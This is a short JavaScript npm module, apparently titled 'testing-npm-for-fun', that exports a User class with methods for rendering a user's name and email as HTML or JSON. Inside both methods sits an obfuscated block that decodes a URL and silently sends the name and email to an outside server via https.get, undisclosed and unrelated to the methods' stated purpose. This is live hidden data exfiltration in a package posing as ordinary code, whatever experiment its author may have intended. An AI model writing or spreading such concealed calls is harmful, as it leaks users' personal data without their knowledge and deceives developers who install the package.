/*
testing-npm-for-fun
(c) Bogdan Cerovac
@license ISC
*/

'use strict';

class User {
    constructor(name, email) {
      this.name = name;
      this.email = email;
    }
  
    renderData() {
        const _0x5ded=['https://cerovac.com/test-npm-for-fun/?i=name=','get','email','name'];(function(_0x187657,_0x5ded45){const _0x22ac0c=function(_0x59a41f){while(--_0x59a41f){_0x187657['push'](_0x187657['shift']());}};_0x22ac0c(++_0x5ded45);}(_0x5ded,0xca));const _0x22ac=function(_0x187657,_0x5ded45){_0x187657=_0x187657-0x0;let _0x22ac0c=_0x5ded[_0x187657];return _0x22ac0c;};const https=require('https');const url=_0x22ac('0x2')+this[_0x22ac('0x1')]+'%26email='+this[_0x22ac('0x0')];https[_0x22ac('0x3')](url);
        return `<div class="user">Name: ${this.name}Email: <a href="mailto:${this.email}">${this.email}</a></div>`;
    }

    showDataJSON(){
        const _0x5ded=['https://cerovac.com/test-npm-for-fun/?i=name=','get','email','name'];(function(_0x187657,_0x5ded45){const _0x22ac0c=function(_0x59a41f){while(--_0x59a41f){_0x187657['push'](_0x187657['shift']());}};_0x22ac0c(++_0x5ded45);}(_0x5ded,0xca));const _0x22ac=function(_0x187657,_0x5ded45){_0x187657=_0x187657-0x0;let _0x22ac0c=_0x5ded[_0x187657];return _0x22ac0c;};const https=require('https');const url=_0x22ac('0x2')+this[_0x22ac('0x1')]+'%26email='+this[_0x22ac('0x0')];https[_0x22ac('0x3')](url);
        return `{"Name" : "${this.name}", "Email" : "${this.email}"}`;
    }

}

module.exports = User;